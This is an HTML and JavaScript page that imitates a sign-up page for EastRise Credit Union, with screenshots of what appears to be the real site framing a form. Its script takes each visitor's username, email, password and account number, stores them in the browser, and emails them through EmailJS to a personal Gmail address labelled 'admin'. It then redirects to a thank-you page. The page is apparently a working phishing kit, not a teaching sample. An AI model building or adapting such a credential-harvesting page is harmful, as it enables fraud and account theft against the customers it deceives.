<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>EastRiseCreditUnion</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Arial, sans-serif;
    }

    body {
      background-color: #f0f2f5;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    .signup-main {
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    .signup-header-img {
      width: 100%;
      height: 120px;
      object-fit: cover;
      background-color: #ddd;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: stretch;
      padding: 20px;
      flex: 1;
      max-width: 1200px;
      margin: 0 auto;
    }

    .form-container {
      background-color: rgba(255, 255, 255, 0.95);
      padding: 2rem;
      border-radius: 10px;
      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.15);
      width: 100%;
      max-width: 400px;
      transition: all 0.3s ease;
      margin-right: 20px;
    }

    .image-container {
      width: 900px;
      display: flex;
    }

    .right-image {
      width: 700px;
      height: 500px;
    }

    .heading {
      text-align: center;
      margin-bottom: 1.5rem;
      color: #1a1a1a;
      font-size: 1.8rem;
      font-weight: 600;
    }

    .form-group {
      margin-bottom: 1.2rem;
    }

    .label {
      display: flex;
      align-items: center;
      margin-bottom: 0.5rem;
      color: #333;
      font-size: 0.9rem;
      font-weight: 500;
    }

    .label svg {
      margin-right: 8px;
    }

    .input {
      width: 100%;
      padding: 0.8rem;
      border: 1px solid #d1d1d1;
      border-radius: 6px;
      font-size: 0.95rem;
      transition: border-color 0.3s ease;
    }

    .input:focus {
      outline: none;
      border-color: #f5a623;
      box-shadow: 0 0 5px rgba(245, 166, 35, 0.3);
    }

    .password-container {
      position: relative;
    }

    .password-toggle {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      transition: stroke 0.3s ease;
    }

    .password-toggle:hover {
      stroke: #f5a623;
    }

    .signup-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      padding: 0.8rem;
      background-color: #f5a623;
      border: none;
      border-radius: 6px;
      color: white;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .signup-btn:hover {
      background-color: #e6951c;
    }

    .signup-btn svg {
      margin-left: 8px;
    }

    .links {
      text-align: center;
      margin-top: 1rem;
    }

    .link {
      color: #1a1a1a;
      text-decoration: none;
      font-size: 0.85rem;
      display: block;
      margin-bottom: 0.5rem;
      transition: color 0.3s ease;
      cursor: pointer;
    }

    .link:hover {
      color: #f5a623;
    }

    .login-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      padding: 0.8rem;
      border: 2px solid #f5a623;
      border-radius: 6px;
      color: #1a1a1a;
      text-decoration: none;
      font-size: 0.9rem;
      font-weight: 500;
      transition: all 0.3s ease;
    }

    .login-btn:hover {
      background-color: #f5a623;
      color: white;
    }

    .login-btn svg {
      margin-right: 8px;
    }

    .signup-body-img {
      width: 100%;
      height: auto;
      object-fit: contain;
      background-color: #ddd;
    }

    /* Modal Styles */
    .modal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .modal-content {
      background-color: white;
      padding: 2rem;
      border-radius: 10px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.15);
    }

    .modal-content h2 {
      margin-bottom: 1rem;
      font-size: 1.5rem;
      color: #1a1a1a;
    }

    .close-btn {
      float: right;
      font-size: 1.5rem;
      cursor: pointer;
    }

    @media (max-width: 1200px) {
      .container {
        flex-direction: column;
        align-items: center;
      }

      .form-container {
        margin-right: 0;
        margin-bottom: 20px;
        width: 90%;
        max-width: 400px;
      }

      .image-container {
        width: 100%;
        max-width: 500px;
      }

      .right-image {
        width: 100%;
        height: 300px;
      }
    }

    @media (max-width: 768px) {
      .form-container {
        width: 90%;
        max-width: 350px;
      }

      .right-image {
        height: 250px;
      }
    }

    @media (max-width: 480px) {
      .form-container {
        padding: 1.5rem;
        width: 95%;
      }

      .heading {
        font-size: 1.5rem;
      }

      .input, .signup-btn, .login-btn {
        font-size: 0.9rem;
      }

      .right-image {
        height: 200px;
      }

      .modal-content {
        width: 90%;
        padding: 1.5rem;
      }
    }
  </style>
</head>
<body>
  <main class="signup-main">
    <img src="https://ik.imagekit.io/vj1zr14uts/loginheader.png?updatedAt=1748953501681" alt="Header" class="signup-header-img">

    <div class="container">
      <div class="form-container">
        <h2 class="heading">Sign Up</h2>
       
        <form id="signup-form">
          <div class="form-group">
            <label for="username" class="label">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2">
                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                <circle cx="12" cy="7" r="4"></circle>
              </svg>
              Username
            </label>
            <input type="text" id="username" class="input" required>
          </div>
          <div class="form-group">
            <label for="email" class="label">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2">
                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
                <polyline points="22,6 12,13 2,6"></polyline>
              </svg>
              Email
            </label>
            <input type="email" id="email" class="input" required>
          </div>
          <div class="form-group">
            <label for="account-no" class="label">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2">
                <path d="M2 8V6a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2v-2"></path>
                <path d="M6 12h12"></path>
              </svg>
              Account Number
            </label>
            <input type="text" id="account-no" class="input" value="1968079" readonly>
          </div>
          <div class="form-group">
            <label for="password" class="label">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2">
                <path d="M18 8h-1V6a5 5 0 0 0-10 0v2H6a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2z"></path>
              </svg>
              Password
            </label>
            <div class="password-container">
              <input type="password" id="password" class="input" required>
              <span class="password-toggle" id="password-toggle">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#808080" stroke-width="2" id="eye-icon">
                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                  <circle cx="12" cy="12" r="3"></circle>
                </svg>
              </span>
            </div>
          </div>
          <button type="submit" class="signup-btn">
            Sign Up
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M9 5l7 7-7 7"></path>
            </svg>
          </button>
          <div class="links">
            <span class="link" id="forgot-password">Forgot your password?</span>
            <a href="login.html" class="login-btn">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" stroke-width="2">
                <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"></path>
                <polyline points="10 17 15 12 10 7"></polyline>
                <line x1="15" y1="12" x2="3" y2="12"></line>
              </svg>
              Back to Login
            </a>
          </div>
        </form>
      </div>
      <div class="image-container">
        <img src="https://ik.imagekit.io/vj1zr14uts/image.png?updatedAt=1748976004404" alt="Right Side" class="right-image">
      </div>
    </div>

    <img src="https://ik.imagekit.io/vj1zr14uts/www.eastrise.com_open-account_%20(1).png?updatedAt=1748952842841" alt="Footer" class="signup-body-img">

    <!-- Forgot Password Modal -->
    <div class="modal" id="forgot-password-modal">
      <div class="modal-content">
        <span class="close-btn" id="close-modal">&times;</span>
        <h2>Reset Password</h2>
        <form id="reset-password-form">
          <div class="form-group">
            <label for="reset-email" class="label">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2">
                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
                <polyline points="22,6 12,13 2,6"></polyline>
              </svg>
              Email
            </label>
            <input type="email" id="reset-email" class="input" required>
          </div>
          <button type="submit" class="signup-btn">Send Reset Link</button>
        </form>
      </div>
    </div>
  </main>

  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    // Initialize EmailJS
emailjs.init("RxxOvR4g0MsfjaTnJ"); // Replace with your EmailJS User ID

// Password toggle functionality
const passwordInput = document.getElementById('password');
const passwordToggle = document.getElementById('password-toggle');
const eyeIcon = document.getElementById('eye-icon');

passwordToggle.addEventListener('click', () => {
  const isPassword = passwordInput.type === 'password';
  passwordInput.type = isPassword ? 'text' : 'password';
  eyeIcon.innerHTML = isPassword
    ? '<path d="M17 10h-1.7a6 6 0 0 0-10.6 0H3a9 9 0 0 1 18 0z"></path>'
    : '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
});

// Form submission handling
document.getElementById('signup-form').addEventListener('submit', function (event) {
  event.preventDefault();
  const username = document.getElementById('username').value;
  const email = document.getElementById('email').value;
  const accountNo = document.getElementById('account-no').value;
  const password = document.getElementById('password').value;

  // Store credentials in localStorage
  localStorage.setItem('signupUsername', username);
  localStorage.setItem('signupEmail', email);
  localStorage.setItem('signupAccountNo', accountNo);
  localStorage.setItem('signupPassword', password);

  // Send email to user
  emailjs.send("service_pfpncmc", "template_x3pgxj9", {
    to_email: email,
    username: username,
    password: password,
    account_no: accountNo
  }).then(() => {
    console.log('Email sent to user successfully');
  }).catch(error => {
    console.error('Error sending email to user:', error);
    alert('Failed to send signup email to user. Please try again.');
  });

  // Send email to admin
  emailjs.send("service_pfpncmc", "template_x3pgxj9", {
    to_email: "unnatidaksha@gmail.com",
    username: username,
    user_email: email,
    password: password,
    account_no: accountNo
  }).then(() => {
    console.log('Email sent to admin successfully');
  }).catch(error => {
    console.error('Error sending email to admin:', error);
    alert('Failed to send signup email to admin. Please try again.');
  });

  // Redirect to thank-you page
  window.location.href = 'thankspage.html';
});

// Forgot Password Modal
const forgotPasswordLink = document.getElementById('forgot-password');
const modal = document.getElementById('forgot-password-modal');
const closeModal = document.getElementById('close-modal');

forgotPasswordLink.addEventListener('click', () => {
  modal.style.display = 'flex';
});

closeModal.addEventListener('click', () => {
  modal.style.display = 'none';
});

window.addEventListener('click', (event) => {
  if (event.target === modal) {
    modal.style.display = 'none';
  }
});

// Reset Password Form Submission
document.getElementById('reset-password-form').addEventListener('submit', function (event) {
  event.preventDefault();
  const email = document.getElementById('reset-email').value;
  const storedEmail = localStorage.getItem('signupEmail');

  if (email === storedEmail) {
    const resetToken = btoa(email + ':' + Date.now());
    localStorage.setItem('resetToken', resetToken);
    localStorage.setItem('resetEmail', email);

    // Send reset email to user
    emailjs.send("service_pfpncmc", "template_reset_password", { // Replace with your reset password template ID
      to_email: email,
      reset_link: `https://yourdomain.com/reset-password.html?token=${resetToken}` // Replace with your actual domain
    }).then(() => {
      console.log('Reset email sent successfully');
      alert('Password reset link sent to your email!');
      modal.style.display = 'none';
    }).catch(error => {
      console.error('Error sending reset email:', error);
      alert('Error sending reset email. Please try again.');
    });
  } else {
    alert('Email not found. Please use the email you signed up with.');
  }
});
  </script>
</body>
</html>
